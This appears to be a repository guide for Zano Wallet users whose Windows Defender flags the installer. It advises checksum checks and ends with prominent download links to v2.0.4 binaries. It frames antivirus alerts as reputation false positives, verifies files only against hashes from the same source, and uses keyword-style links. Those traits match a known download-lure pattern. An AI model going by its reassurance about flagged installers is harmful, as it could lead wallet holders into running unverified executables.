<p align="center"><img src="https://raw.githubusercontent.com/zano-projects/Zano-Wallet/main/learn/assets/05-self-custody-security.webp" alt="Zano Wallet - Windows Defender Flags the Zano Wallet Installer: What to Do" width="100%"></p>

<h1 align="center">Windows Defender Flags the Zano Wallet Installer: What to Do</h1>

<p align="center">
<a href="https://github.com/zano-projects"><img src="https://img.shields.io/badge/GitHub-zano--projects-7c5cff?style=for-the-badge&logo=github" alt="Zano Wallet on GitHub"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4"><img src="https://img.shields.io/badge/Release-v2.0.4-1f2a6b?style=for-the-badge" alt="Zano Wallet v2.0.4 release"></a>
<a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn"><img src="https://img.shields.io/badge/Guides-Zano%20Wallet%20Learn-3b2a8f?style=for-the-badge" alt="Zano Wallet guides"></a>
</p>

---

**Short answer:** Check the installer's SHA-256 against the release page first; if it matches, the warning is a reputation alert for a new file, not proof of malware.

## You'll see this if

- SmartScreen says Windows protected your PC
- Defender quarantines the installer right after download

## Why it happens

Antivirus tools score files partly on how many people have run them. A freshly published wallet build has little history yet, and crypto software is a frequent target of heuristics.

## How to fix it

1. Do not run anything yet.
2. Compare the file's SHA-256 with the table on the release page.
3. If every character matches, the file is the published build.
4. If it does not match, delete it and download again from the release page only.
5. Report persistent false positives to Microsoft so the file reputation improves.

Related reading: [How to Install Zano Wallet on Windows 10 and 11](./install-zano-wallet-windows.md) and the [Zano Wallet FAQ](https://github.com/zano-projects/Zano-Wallet/tree/main/learn).

## If that didn't work

If the hash still does not match after a fresh download, stop and do not install. Ask in the project's issue tracker. You can also read [Avoid Fake Zano Wallet Downloads](./avoid-fake-zano-wallet-sites.md).

## Prevent it next time

Only ever download from the tagged release linked here, never from a mirror, a chat link or a search ad. More guides: [is Zano Wallet legit](https://github.com/zano-projects/Zano-Wallet/tree/main/learn).

> [!WARNING]
> Nobody from Zano Wallet will ever ask for your seed phrase. Never type it into a website or chat.

## FAQ

**Should I turn off my antivirus?**  
No. Verify the checksum instead; never disable protection to install wallet software.

**Why does the warning come back after updates?**  
Each new build starts with fresh reputation.

---

## The fix in one step: install the latest Zano Wallet

The current release, **Zano Wallet v2.0.4**, includes the latest fixes. Download it from the [tagged release](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4):

[![Download Zano Wallet for Windows](https://img.shields.io/badge/Download-Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) [![Download Zano Wallet for macOS](https://img.shields.io/badge/Download-macOS-111111?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) [![Download Zano Wallet for Linux](https://img.shields.io/badge/Download-Linux-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip)

| Platform | File | Version |
|---|---|---|
| Windows | [zano-wallet-2.0.4-installer.exe](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4-installer.exe) | v2.0.4 |
| macOS | [zano-wallet-2.0.4.dmg](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.dmg) | v2.0.4 |
| Linux | [zano-wallet-2.0.4.zip](https://github.com/zano-projects/Zano-Wallet/releases/download/v2.0.4/zano-wallet-2.0.4.zip) | v2.0.4 |

> [!TIP]
> Compare the SHA-256 with the table on the [release page](https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4) before running the installer.

## Related guides

| Guide | More |
|---|---|
| [How to Install Zano Wallet on Windows 10 and 11](./install-zano-wallet-windows.md) | [Zano Wallet FAQ](https://github.com/zano-projects/Zano-Wallet/tree/main/learn) |
| [Avoid Fake Zano Wallet Downloads](./avoid-fake-zano-wallet-sites.md) | [is Zano Wallet legit](https://github.com/zano-projects/Zano-Wallet/tree/main/learn) |
| [How to Update Zano Wallet to the Latest Version](./update-zano-wallet.md) | [download the latest Zano Wallet](https://github.com/zano-projects/Zano-Wallet/tree/main/learn) |

---

<p align="center"><a href="https://github.com/zano-projects">github.com/zano-projects</a> · <a href="https://github.com/zano-projects/Zano-Wallet/releases/tag/v2.0.4">Release v2.0.4</a> · <a href="https://github.com/zano-projects/Zano-Wallet/tree/main/learn">All guides</a></p>
